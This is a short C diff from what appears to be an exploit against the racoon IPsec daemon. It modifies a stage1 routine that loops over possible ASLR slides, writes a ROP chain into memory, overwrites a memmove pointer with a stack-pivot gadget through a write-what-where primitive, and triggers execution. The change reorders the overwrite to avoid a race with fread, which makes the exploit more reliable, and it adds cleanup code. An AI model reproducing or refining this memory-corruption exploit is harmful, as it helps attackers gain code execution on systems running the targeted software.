@@ -58,7 +58,6 @@ void stage1(int fd, offset_struct_t * offsets) {
 	printf("%d iterations\n",iterations);
 	for (int i = iterations; i >= 0; i--) {
 		uint64_t slide = i*offsets->slide_value;
-		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
 		
 		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 		uint64_t curr_ropchain_addr = ropchain_addr;
@@ -73,7 +72,21 @@ void stage1(int fd, offset_struct_t * offsets) {
 			curr_gadget = curr_gadget->next;
 			curr_ropchain_addr += 8;
 		}
+		// we have to write and then trigger right afterwards otherwise racoon might call fread between the write and the trigger
+		// to get a new chunk of data and then fread will use the corrupted memmove pointer
+		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
 		trigger_exec(fd,offsets->str_buff_offset, ropchain_addr);
+	}
+	
+	// cleanup
+	rop_gadget_t *  current = offsets->stage1_ropchain;
+	while (current != NULL) {
+		if (current->comment != NULL) {
+			free(current->comment);
+		}
+		rop_gadget_t * next = current->next;
+		free(current);
+		current = next;
 	}
 }
 
